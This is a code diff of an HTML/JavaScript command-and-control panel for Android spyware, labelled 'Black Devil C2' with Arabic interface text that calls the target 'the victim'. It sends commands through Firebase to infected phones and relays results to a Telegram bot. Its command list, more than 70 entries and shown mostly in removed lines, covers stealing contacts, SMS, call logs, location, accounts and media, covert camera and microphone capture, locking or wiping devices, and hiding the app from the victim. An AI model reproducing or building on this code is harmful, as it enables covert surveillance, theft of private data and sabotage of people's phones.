+        const cmdId = currentCommandId;
+        const deviceId = 'device_test';
+
+        if (actionId === 'execute') {
+            // إرسال الأمر إلى Firebase (commands/{deviceId})
+            db.ref(`commands/${deviceId}`).set({
+                command: cmdId,
+                timestamp: Date.now()
+            }).then(() => {
+                document.getElementById('pageStatus').innerText = '📤 تم إرسال الأمر للضحية...';
+                // انتظر ثواني ثم جلب النتيجة
+                setTimeout(() => fetchCommandResult(cmdId), 3000);
+            }).catch(e => alert('خطأ في الإرسال: ' + e.message));
+        }
+        else if (actionId === 'telegram') {
+            // إرسال النتيجة الحالية إلى البوت عبر Firebase (سيتم معالجتها من الضحية)
+            db.ref(`commands/${deviceId}`).set({
+                command: `send_to_telegram_${cmdId}`,
+                timestamp: Date.now()
+            }).then(() => {
+                alert('✅ تم طلب إرسال النتيجة إلى البوت');
+            }).catch(e => alert('❌ فشل الإرسال: ' + e.message));
+        }
+        else if (actionId === 'copy') {
+            // نسخ النص الموجود في منطقة النتائج
+            const resultBox = document.querySelector('#cmdBody .result-box');
+            if (resultBox) {
+                const text = resultBox.innerText;
+                navigator.clipboard.writeText(text).then(() => {
+                    alert('✅ تم نسخ المحتوى إلى الحافظة');
+                }).catch(() => {
+                    // بديل للنسخ
+                    const area = document.createElement('textarea');
+                    area.value = text;
+                    document.body.appendChild(area);
+                    area.select();
+                    document.execCommand('copy');
+                    area.remove();
+                    alert('✅ تم النسخ (طريقة بديلة)');
                 });
-                database.ref('devices').on('value', snapshot => {
-                    const data = snapshot.val();
-                    if (data) updateFiles(data);
-                });
-                generateCommands();
-                alert('✅ تم الاتصال بـ Firebase');
-            } catch(e) { alert('❌ خطأ: ' + e.message); }
-        }
-
-        function updateDevices() {
-            const container = document.getElementById('deviceList');
-            container.innerHTML = '';
-            const keys = Object.keys(devices);
-            if (keys.length === 0) {
-                container.innerHTML = '<div style="color:#660000;text-align:center;">⏳ لا توجد أجهزة مسجلة</div>';
-                return;
-            }
-            for (let id in devices) {
-                const dev = devices[id];
-                const div = document.createElement('div');
-                div.className = 'device-item';
-                div.innerHTML = `<div class="name">📱 ${dev.device_name}</div><div class="version">🤖 ${dev.android || 'غير معروف'}</div>`;
-                div.onclick = () => {
-                    selectedDevice = id;
-                    selectedDeviceName = dev.device_name || 'الجهاز';
-                    alert('✅ تم اختيار: ' + selectedDeviceName);
-                    if (dataListener) {
-                        database.ref('devices').child(id).child('data').off('value', dataListener);
-                    }
-                    dataListener = database.ref('devices').child(id).child('data').on('value', snapshot => {
-                        const data = snapshot.val();
-                        if (data) showFile(data);
-                    });
-                };
-                container.appendChild(div);
+            } else {
+                alert('❌ لا يوجد نص لنسخه');
             }
         }
-
-        function updateFiles(data) {
-            const container = document.getElementById('fileList');
-            let html = '';
-            let found = false;
-            for (let id in data) {
-                const dev = data[id];
-                if (dev && dev.data && dev.data.FILE) {
-                    found = true;
-                    const fileData = dev.data.FILE;
-                    try {
-                        const json = JSON.parse(fileData);
-                        html += `<div class="file-item"><span class="name">📄 ${json.name}</span><span class="size">${json.caption || ''}</span></div>`;
-                    } catch(e) {}
+        else if (actionId === 'download') {
+            // تحميل الملف (إذا كان رابطاً)
+            const link = document.querySelector('#cmdBody .file-link');
+            if (link && link.href) {
+                const a = document.createElement('a');
+                a.href = link.href;
+                a.download = link.href.split('/').pop() || 'file';
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+            } else {
+                // إذا كان النص يحتوي على رابط مباشر
+                const bodyText = document.querySelector('#cmdBody .result-box')?.innerText || '';
+                const urlMatch = bodyText.match(/(https?:\/\/[^\s]+)/);
+                if (urlMatch) {
+                    window.open(urlMatch[0], '_blank');
+                } else {
+                    alert('❌ لا يوجد رابط تحميل متاح');
                 }
             }
-            container.innerHTML = found ? html : '<div style="color:#660000;text-align:center;">📭 لا توجد ملفات</div>';
         }
-
-        function showFile(data) {
-            const container = document.getElementById('fileList');
-            try {
-                const json = JSON.parse(data);
-                if (json.name && json.url) {
-                    container.innerHTML = `<div class="file-item"><span class="name">✅ ${json.name}</span><a href="${json.url}" target="_blank" style="color:#00ff00;">📥 تحميل</a></div>`;
-                }
-            } catch(e) {}
-        }
-
-        function execCmd(cmd) {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
-            commandsRef.child(selectedDevice).set(cmd);
-            showStatus('📤 تم إرسال الأمر: ' + cmd + ' إلى ' + selectedDeviceName);
-        }
-
-        function toggleHide() {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            const action = confirm('إخفاء التطبيق على ' + selectedDeviceName + '؟') ? 'hide_app' : 'show_app';
-            commandsRef.child(selectedDevice).set(action);
-            showStatus('✅ تم إرسال الأمر: ' + action);
-        }
-
-        function saveSettings() {
-            const apiKey = document.getElementById('apiKey').value;
-            const databaseURL = document.getElementById('databaseURL').value;
-            localStorage.setItem('fb_apiKey', apiKey);
-            localStorage.setItem('fb_databaseURL', databaseURL);
-            alert('✅ تم حفظ الإعدادات');
-            initFirebase();
-        }
-
-        // ===== نظام الصفحات الفرعية =====
-        function openSubPage(title, html) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('subpage').classList.add('active');
-            document.getElementById('subpageContent').innerHTML = `<h3 style="color:#ff0000;margin-bottom:15px;">${title}</h3>${html}`;
-        }
-
-        function closeSubPage() {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('page-commands').classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.querySelectorAll('.nav-item')[1].classList.add('active');
-        }
-
-        function showStatus(msg) {
-            const statusDiv = document.getElementById('statusMsg');
-            if (statusDiv) {
-                statusDiv.innerHTML = msg;
-                statusDiv.className = 'status-msg';
+        else if (actionId === 'open') {
+            // فتح الملف (محاولة فتح الرابط أو تنزيل ثم فتح)
+            const link = document.querySelector('#cmdBody .file-link');
+            if (link && link.href) {
+                window.open(link.href, '_blank');
+            } else {
+                alert('❌ لا يوجد ملف لفتحه');
             }
         }
+    }
 
-        function execCmdWithAction(cmd, action) {
-            if (!selectedDevice) return alert('⚠️ اختر جهازاً أولاً');
-            if (!commandsRef) return alert('⚠️ Firebase غير متصل');
-            commandsRef.child(selectedDevice).set(cmd);
-            showStatus(`📤 ${action} على ${selectedDeviceName}`);
-            setTimeout(() => showStatus(`✅ تم تنفيذ الأمر بنجاح!`), 2000);
-        }
+    // ================================================================
+    //  5.  الرجوع إلى القائمة الرئيسية
+    // ================================================================
+    document.getElementById('backToMenu').onclick = function() {
+        document.getElementById('commandPage').classList.remove('active');
+        document.getElementById('mainMenu').classList.remove('hidden');
+        // إلغاء الاستماع إذا وجد
+    };
 
-        // ===== توليد الأوامر (أكثر من 50 أمر) =====
-        function generateCommands() {
-            const commands = [
-                // أساسيات
-                { id: 'get_contacts', icon: '📇', label: 'جهات الاتصال', desc: 'جلب جهات الاتصال' },
-                { id: 'copy_contacts', icon: '📋', label: 'نسخ جهات الاتصال', desc: 'نسخ جهات الاتصال' },
-                { id: 'export_contacts', icon: '📤', label: 'تصدير جهات الاتصال', desc: 'تصدير جهات الاتصال' },
-                { id: 'get_sms', icon: '💬', label: 'الرسائل', desc: 'جلب الرسائل النصية' },
-                { id: 'forward_sms', icon: '↪️', label: 'إعادة توجيه الرسائل', desc: 'إعادة توجيه الرسائل' },
-                { id: 'get_calllogs', icon: '📞', label: 'سجل المكالمات', desc: 'جلب سجل المكالمات' },
-                { id: 'call_history', icon: '📋', label: 'سجل المكالمات', desc: 'عرض سجل المكالمات' },
-                { id: 'get_location', icon: '📍', label: 'الموقع', desc: 'الحصول على الموقع الحالي' },
-                { id: 'start_location_track', icon: '🔄', label: 'تتبع الموقع', desc: 'بدء تتبع الموقع' },
-                { id: 'stop_location_track', icon: '⏹', label: 'إيقاف التتبع', desc: 'إيقاف تتبع الموقع' },
-                { id: 'get_device', icon: '📱', label: 'معلومات الجهاز', desc: 'عرض معلومات الجهاز' },
-                { id: 'get_network', icon: '🌐', label: 'معلومات الشبكة', desc: 'عرض معلومات الشبكة' },
-                { id: 'get_imei', icon: '📟', label: 'IMEI', desc: 'جلب رقم IMEI' },
-                { id: 'get_phone', icon: '📞', label: 'رقم الهاتف', desc: 'جلب رقم الهاتف' },
-                { id: 'get_sim', icon: '📡', label: 'معلومات SIM', desc: 'جلب معلومات SIM' },
-                { id: 'get_wifi', icon: '📶', label: 'الواي فاي', desc: 'جلب معلومات الواي فاي' },
-                { id: 'get_battery', icon: '🔋', label: 'البطارية', desc: 'جلب مستوى البطارية' },
-                { id: 'get_ip', icon: '🌐', label: 'IP العام', desc: 'جلب IP العام' },
-                { id: 'get_apps', icon: '📱', label: 'التطبيقات', desc: 'قائمة التطبيقات' },
-                { id: 'get_accounts', icon: '👤', label: 'الحسابات', desc: 'جلب الحسابات المسجلة' },
-                { id: 'get_clipboard', icon: '📋', label: 'الحافظة', desc: 'جلب محتوى الحافظة' },
-                // الوسائط
-                { id: 'get_photos', icon: '🖼', label: 'الصور', desc: 'سحب الصور' },
-                { id: 'get_photos_5', icon: '🖼', label: '5 صور', desc: 'سحب 5 صور' },
-                { id: 'get_photos_10', icon: '🖼', label: '10 صور', desc: 'سحب 10 صور' },
-                { id: 'get_photos_20', icon: '🖼', label: '20 صورة', desc: 'سحب 20 صورة' },
-                { id: 'get_photos_30', icon: '🖼', label: '30 صورة', desc: 'سحب 30 صورة' },
-                { id: 'get_videos', icon: '🎬', label: 'الفيديوهات', desc: 'سحب الفيديوهات' },
-                { id: 'get_videos_5', icon: '🎬', label: '5 فيديوهات', desc: 'سحب 5 فيديوهات' },
-                { id: 'get_videos_10', icon: '🎬', label: '10 فيديوهات', desc: 'سحب 10 فيديوهات' },
-                { id: 'get_files', icon: '📦', label: 'جميع الملفات', desc: 'سحب جميع الملفات' },
-                // الكاميرا والفلاش
-                { id: 'take_photo', icon: '📸', label: 'تصوير خلفي', desc: 'التقاط صورة بالكاميرا الخلفية' },
-                { id: 'take_photo_front', icon: '🤳', label: 'تصوير أمامي', desc: 'التقاط صورة بالكاميرا الأمامية' },
-                { id: 'flash_on', icon: '🔦', label: 'فلاش تشغيل', desc: 'تشغيل الفلاش' },
-                { id: 'flash_off', icon: '🔦', label: 'فلاش إيقاف', desc: 'إيقاف الفلاش' },
-                // الصوت
-                { id: 'start_record', icon: '🎙', label: 'تسجيل صوت', desc: 'بدء تسجيل الصوت' },
-                { id: 'stop_record', icon: '⏹', label: 'إيقاف التسجيل', desc: 'إيقاف تسجيل الصوت' },
-                { id: 'set_volume_max', icon: '🔊', label: 'رفع الصوت', desc: 'رفع الصوت للأعلى' },
-                { id: 'set_volume_min', icon: '🔇', label: 'خفض الصوت', desc: 'خفض الصوت للأدنى' },
-                { id: 'set_ringtone_volume', icon: '🔊', label: 'نغمة الرنين', desc: 'ضبط نغمة الرنين' },
-                { id: 'set_media_volume', icon: '🎵', label: 'صوت الوسائط', desc: 'ضبط صوت الوسائط' },
-                // مشرف الجهاز
-                { id: 'lock_device', icon: '🔒', label: 'قفل الجهاز', desc: 'قفل جهاز الضحية' },
-                { id: 'set_lock_password', icon: '🔑', label: 'تعيين كلمة مرور', desc: 'تعيين كلمة مرور جديدة' },
-                { id: 'clear_lock_password', icon: '🔓', label: 'إلغاء كلمة المرور', desc: 'إلغاء كلمة المرور' },
-                { id: 'wipe_device', icon: '🧹', label: 'مسح البيانات', desc: 'مسح جميع بيانات الجهاز' },
-                { id: 'set_password_rules', icon: '📋', label: 'قواعد كلمة المرور', desc: 'تعيين قواعد كلمة المرور' },
-                { id: 'disable_camera', icon: '📷', label: 'تعطيل الكاميرا', desc: 'تعطيل الكاميرا' },
-                { id: 'enable_camera', icon: '📷', label: 'تفعيل الكاميرا', desc: 'تفعيل الكاميرا' },
-                // التحكم بالجهاز
-                { id: 'hide_app', icon: '👁‍🗨', label: 'إخفاء التطبيق', desc: 'إخفاء التطبيق عن الضحية' },
-                { id: 'show_app', icon: '👁', label: 'إظهار التطبيق', desc: 'إظهار التطبيق للضحية' },
-                { id: 'fake_notif', icon: '🔔', label: 'إشعار وهمي', desc: 'إرسال إشعار وهمي' },
-                { id: 'reboot', icon: '🔄', label: 'إعادة تشغيل', desc: 'إعادة تشغيل الجهاز' },
-                { id: 'shutdown', icon: '⏻', label: 'إيقاف تشغيل', desc: 'إيقاف تشغيل الجهاز' },
-                { id: 'vibrate', icon: '📳', label: 'اهتزاز', desc: 'تشغيل الاهتزاز' },
-                { id: 'clear_data', icon: '🧹', label: 'مسح البيانات', desc: 'مسح بيانات التطبيقات' },
-                { id: 'kill_apps', icon: '🗑️', label: 'إيقاف التطبيقات', desc: 'إيقاف جميع التطبيقات الجارية' },
-                // الشبكة
-                { id: 'toggle_wifi_on', icon: '📶', label: 'تشغيل الواي فاي', desc: 'تشغيل الواي فاي' },
-                { id: 'toggle_wifi_off', icon: '📶', label: 'إيقاف الواي فاي', desc: 'إيقاف الواي فاي' },
-                { id: 'toggle_bluetooth_on', icon: '📶', label: 'تشغيل البلوتوث', desc: 'تشغيل البلوتوث' },
-                { id: 'toggle_bluetooth_off', icon: '📶', label: 'إيقاف البلوتوث', desc: 'إيقاف البلوتوث' },
-                { id: 'toggle_location_on', icon: '📍', label: 'تشغيل الموقع', desc: 'تشغيل الموقع' },
-                { id: 'toggle_location_off', icon: '📍', label: 'إيقاف الموقع', desc: 'إيقاف الموقع' },
-                // متقدم
-                { id: 'screenshot', icon: '📷', label: 'لقطة شاشة', desc: 'التقاط لقطة شاشة' },
-                { id: 'installed_apps', icon: '📱', label: 'التطبيقات المثبتة', desc: 'قائمة التطبيقات المثبتة' },
-                { id: 'running_processes', icon: '🔄', label: 'العمليات الجارية', desc: 'عرض العمليات الجارية' },
-                { id: 'set_brightness', icon: '☀️', label: 'سطوع الشاشة', desc: 'ضبط سطوع الشاشة' },
-                { id: 'auto_rotate_on', icon: '🔄', label: 'تدوير تلقائي تشغيل', desc: 'تفعيل التدوير التلقائي' },
-                { id: 'auto_rotate_off', icon: '🔄', label: 'تدوير تلقائي إيقاف', desc: 'تعطيل التدوير التلقائي' },
-                { id: 'battery_history', icon: '🔋', label: 'معلومات البطارية', desc: 'عرض معلومات البطارية' },
-                { id: 'storage_info', icon: '💾', label: 'معلومات التخزين', desc: 'عرض معلومات التخزين' },
-                // فتح تطبيقات
-                { id: 'open_app_whatsapp', icon: '💬', label: 'فتح واتساب', desc: 'فتح تطبيق واتساب' },
-                { id: 'open_app_facebook', icon: '📘', label: 'فتح فيسبوك', desc: 'فتح تطبيق فيسبوك' },
-                { id: 'open_app_instagram', icon: '📸', label: 'فتح انستغرام', desc: 'فتح تطبيق انستغرام' },
-                { id: 'open_app_youtube', icon: '▶️', label: 'فتح يوتيوب', desc: 'فتح تطبيق يوتيوب' },
-                { id: 'uninstall_app_whatsapp', icon: '🗑️', label: 'حذف واتساب', desc: 'حذف تطبيق واتساب' },
-                // أوامر إضافية
-                { id: 'open_browser', icon: '🌐', label: 'فتح متصفح', desc: 'فتح المتصفح' }
-            ];
+    // ================================================================
+    //  6.  تشغيل التطبيق
+    // ================================================================
+    renderMainMenu();
 
-            const grid = document.getElementById('cmdGrid');
-            grid.innerHTML = '';
-            commands.forEach(cmd => {
-                const div = document.createElement('div');
-                div.className = 'cmd-btn';
-                div.innerHTML = `<span class="icon">${cmd.icon}</span><span class="label">${cmd.label}</span>`;
-                div.onclick = () => openCommandPage(cmd);
-                grid.appendChild(div);
-            });
-        }
-
-        function openCommandPage(cmd) {
-            let html = `<p style="color:#aaa;margin-bottom:15px;">${cmd.desc}</p>`;
-            html += `<div id="statusMsg" class="status-msg" style="display:none;"></div>`;
-            html += `<button class="btn-danger" onclick="execCmdWithAction('${cmd.id}','${cmd.icon} تنفيذ ${cmd.label}')">${cmd.icon} تنفيذ ${cmd.label}</button>`;
-            html += `<button class="btn-success" onclick="showStatus('✅ تم التنفيذ بنجاح!')">✅ تنفيذ</button>`;
-            openSubPage(`${cmd.icon} ${cmd.label}`, html);
-        }
-
-        generateCommands();
-    </script>
+    console.log('🔥 Black Devil C2 Ultra-Wide Panel Loaded. 490+ Pages Ready.');
+</script>
 </body>
 </html>
-<script>
-function copyText(text) {
-    navigator.clipboard.writeText(text).then(() => {
-        alert('✅ تم نسخ النص');
-    });
-}
-</script>
-<button onclick="copyText(document.getElementById('result').innerText)">📋 نسخ النتيجة</button>
